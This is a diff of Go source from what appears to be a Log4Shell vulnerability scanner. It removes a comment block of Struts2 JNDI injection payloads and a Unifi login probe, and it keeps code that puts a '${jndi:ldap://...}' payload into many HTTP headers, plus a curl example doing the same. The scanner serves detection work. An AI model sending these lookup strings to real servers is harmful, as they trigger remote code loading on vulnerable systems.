@@ -34,56 +34,6 @@ func CheckX3(u string) bool {
 	return false
 }
 
-/*
-	struts2 https://www.moonsec.com/5663.html
-
-方法4：checkbox 拦截器,超过1个checkebox触发: .action?__checkbox_${jndi:ldap://127.0.0.1:1099/exp}=a&__checkbox_${jndi:ldap://127.0.0.1:1099/exp}=b
-方法1：静态文件If-Modified-Since头
-方法2：检查请求参数长度
-此检测payload摘自p1ay2win 天玄安全实验室原创，检测payload如下：
-http://localhost:8080/helloworld_war/hello.action?$%7Bjndi:rmi://127.0.0.1:8888/Calc%7Daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=123
-检测原理：debug级别，访问一个存在的Struts2框架的action地址，Struts2框架会检查请求参数名的长度，若长度超过默认的100个字符，请求参数名则会输出到debug日志中，触发log4j2漏洞。
-方法3：检查请求路径触发
-此检测payload摘自p1ay2win 天玄安全实验室原创，检测payload如下：
-http://localhost:8080/helloworld_war/$%7Bjndi:rmi:$%7B::-/%7D/127.0.0.1:8888/Calc%7D/
-本地测试怎么都测试不成功，发现需要将rmi替换成ldap
-http://localhost:8080/helloworld_war/$%7Bjndi:ldap:$%7B::-/%7D/127.0.0.1:8888/Calc%7D/
-但是还有一个问题就是tomcat会将//识别为/，这里就需要将payload进行转变，最后可以使用
-$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/
-
-方法5：struts.token.name
-
-此payload收集于网络，原创作者不知道是谁，检测payload如下：
-http://127.0.0.1:8080/struts2-showcase/token/transfer4.action -d struts.token.name=’${jndi:rmi://127.0 .0.1:1099/ylbtsl}’
-*/
-func CheckStruts2() {
-
-}
-
-// Another Log4j on the fire: Unifi
-// https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi
-func CheckLog4jUnifi(u string) {
-	if oU, err := url.Parse(u); nil == err {
-		p1 := fmt.Sprintf(`{"username":"51pwn","password":"xxx","remember":"%s","strict":true}`, "")
-		if r1, err := util.DoPost(oU.Scheme+"://"+oU.Host+"/api/login", map[string]string{
-			"Sec-Ch-Ua":              `"Not A;Brand";v="99", "Chromium";v="96"`,
-			"Sec-Ch-Ua-Mobile":       "?0",
-			"User-Agent: User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
-			"Sec-Ch-Ua-Platform":     "macOS",
-			"Content-Type":           "application/json; charset=utf-8",
-			"Origin":                 "https://" + oU.Host,
-			"Sec-Fetch-Site":         "same-origin",
-			"Sec-Fetch-Mode":         "cors",
-			"Sec-Fetch-Dest":         "empty",
-			"Referer":                "https://" + oU.Host + "/manage/account/login?redirect=%2Fmanage",
-		}, strings.NewReader(p1)); nil == err {
-			if nil != r1 {
-				r1.Body.Close()
-			}
-		}
-	}
-}
-
 // log4j漏洞
 // Temenos T24 还没有找到目标测试
 // https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell?referrer=featured
@@ -131,7 +81,6 @@ func Solr(u string) {
 }
 
 // log4j漏洞
-// VMWare vCenter
 // https://www.sprocketsecurity.com/resources/how-to-exploit-log4j-vulnerabilities-in-vmware-vcenter
 func VCenter(u string) bool {
 	log.Printf("start test VCenter %s\n", u)
@@ -177,15 +126,8 @@ func Check(u string, finalURL string) bool {
 				header := make(map[string]string)
 				header["Content-Type"] = "application/x-www-form-urlencoded"
 				header["User-Agent"] = payload
-
-				// CVE-2021-45046 2.7.0 <= Apache log4j <= 2.14.1
-				// https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/
 				// docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
 				header["X-Api-Version"] = payload
-
-				// VMWare Horizon https://www.sprocketsecurity.com/resources/crossing-the-log4j-horizon-a-vulnerability-with-no-return
-				header["Accept-Language"] = payload
-
 				//log.Println("payload", payload)
 				/* struts2 对静态文件 进行处理 If-Modified-Since，struts2默认静态文件
 				tooltip.gif
@@ -197,7 +139,6 @@ func Check(u string, finalURL string) bool {
 				curl -vv -H "If-Modified-Since: \${jndi:ldap://localhost:80/abc}" http://localhost:8080/struts2-showcase/struts/utils.js
 				*/
 				header["If-Modified-Since"] = payload
-
 				header["Referer"] = payload
 				header["X-Client-IP"] = payload
 				header["X-Remote-IP"] = payload
